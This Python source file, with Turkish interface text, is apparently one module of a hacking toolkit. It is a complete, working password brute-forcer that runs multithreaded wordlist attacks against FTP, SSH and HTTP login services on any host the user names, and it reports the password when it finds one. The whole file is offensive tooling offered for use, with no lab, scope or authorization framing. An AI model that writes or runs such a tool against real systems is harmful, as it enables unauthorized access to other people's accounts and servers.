import socket
import threading
import time
import itertools
import string
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

found_password = None
brute_running = False


def ftp_brute(host, port, username, password):
    global found_password
    if found_password:
        return False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        s.recv(1024)
        s.send(f"USER {username}\r\n".encode())
        s.recv(1024)
        s.send(f"PASS {password}\r\n".encode())
        resp = s.recv(1024).decode()
        s.close()
        if "230" in resp:
            found_password = password
            return True
        return False
    except Exception:
        return False


def ssh_brute(host, port, username, password):
    global found_password
    if found_password:
        return False
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password, timeout=3)
        client.close()
        found_password = password
        return True
    except ImportError:
        console.print("[red]  paramiko gerekli: pip install paramiko[/red]")
        return False
    except Exception:
        return False


def http_brute(host, port, username, password):
    global found_password
    if found_password:
        return False
    try:
        import requests
        r = requests.post(
            f"http://{host}:{port}/login",
            data={"username": username, "password": password},
            timeout=3,
            allow_redirects=False
        )
        if r.status_code in (200, 302) and "invalid" not in r.text.lower() and "error" not in r.text.lower():
            found_password = password
            return True
        return False
    except Exception:
        return False


def load_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        console.print(f"[red]  Wordlist yuklenemedi: {e}[/red]")
        return None


def run():
    global found_password, brute_running

    console.print()
    console.print(f"  [bold purple]🌙 BRUTE FORCE[/bold purple]")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")
    console.print(f"   [#a78bfa][1][/#a78bfa] FTP Brute Force")
    console.print(f"   [#a78bfa][2][/#a78bfa] SSH Brute Force")
    console.print(f"   [#a78bfa][3][/#a78bfa] HTTP Login Brute Force")
    console.print(f"   [#a78bfa][0][/#a78bfa] Geri don")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

    choice = console.input("\n[bold white]  Secim: [/bold white]").strip()

    if choice == "0":
        return

    methods = {"1": ("FTP", ftp_brute, 21), "2": ("SSH", ssh_brute, 22), "3": ("HTTP", http_brute, 80)}

    if choice not in methods:
        console.print("[red]  Gecersiz secim.[/red]")
        return

    name, brute_func, default_port = methods[choice]

    host = console.input("[bold white]  Hedef IP/Domain: [/bold white]").strip()
    port = console.input(f"[bold white]  Port (varsayilan {default_port}): [/bold white]").strip()
    port = int(port) if port.isdigit() else default_port
    username = console.input("[bold white]  Kullanici adi: [/bold white]").strip()
    wordlist_path = console.input("[bold white]  Wordlist dosya yolu: [/bold white]").strip()

    if not host or not username or not wordlist_path:
        console.print("[red]  Tum alanlar gerekli.[/red]")
        return

    passwords = load_wordlist(wordlist_path)
    if not passwords:
        return

    found_password = None
    brute_running = True
    tried = 0

    console.print(f"\n[#a78bfa]  {name} Brute Force baslatildi[/#a78bfa]")
    console.print(f"[dim]  Hedef: {host}:{port} | User: {username} | Wordlist: {len(passwords)} sifre[/dim]")

    with Progress(
        SpinnerColumn(spinner_name="moon"),
        TextColumn("[magenta]{task.description}[/magenta]"),
        BarColumn(bar_width=30, style="purple", complete_style="#a78bfa"),
        TextColumn("[bold white]{task.completed}/{task.total}[/bold white]"),
        console=console,
    ) as progress:
        task = progress.add_task("Deneniyor...", total=len(passwords))

        batch_size = 10
        for i in range(0, len(passwords), batch_size):
            if found_password:
                break

            batch = passwords[i:i + batch_size]
            threads = []
            for pwd in batch:
                t = threading.Thread(target=brute_func, args=(host, port, username, pwd))
                t.start()
                threads.append(t)

            for t in threads:
                t.join(timeout=5)

            tried += len(batch)
            progress.advance(task, len(batch))

            if found_password:
                break

    if found_password:
        console.print(f"\n[bold #a78bfa]  🌕 SIFRE BULUNDU![/bold #a78bfa]")
        console.print(f"[bold white]  Kullanici: {username}[/bold white]")
        console.print(f"[bold white]  Sifre: {found_password}[/bold white]")
        console.print(f"[dim]  {tried} deneme sonrasi.[/dim]")
    else:
        console.print(f"\n[red]  Sifre bulunamadi. {tried} deneme yapildi.[/red]")
